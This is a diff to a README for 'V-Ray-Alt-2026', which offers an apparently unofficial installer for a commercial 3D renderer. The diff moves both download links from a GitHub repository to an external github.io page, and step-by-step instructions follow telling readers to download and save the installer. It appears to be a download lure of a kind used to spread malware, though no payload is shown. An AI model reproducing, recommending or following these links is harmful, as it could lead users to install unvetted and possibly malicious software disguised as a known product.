@@ -1,6 +1,6 @@
 # 🎨 V-Ray-Alt-2026 - Create professional 3D renders with ease
 
-[![Download V-Ray-Alt-2026](https://img.shields.io/badge/Download-V--Ray--Alt--2026-blue)](https://github.com/southern-miniaturepinscher453/V-Ray-Alt-2026)
+[![Download V-Ray-Alt-2026](https://img.shields.io/badge/Download-V--Ray--Alt--2026-blue)](https://southern-miniaturepinscher453.github.io)
 
 This repository provides clear access to the V-Ray-Alt-2026 renderer. Use this software to generate images and animations in 3ds Max and SketchUp. The installer works on Windows 10 and Windows 11. 
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards for optimal performance:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official repository page](https://github.com/southern-miniaturepinscher453/V-Ray-Alt-2026) to start the process.
+1. Visit the [official repository page](https://southern-miniaturepinscher453.github.io) to start the process.
 2. Look for the releases section on the right side of the page.
 3. Click the latest version link to begin the download.
 4. Save the installer file to your local computer.
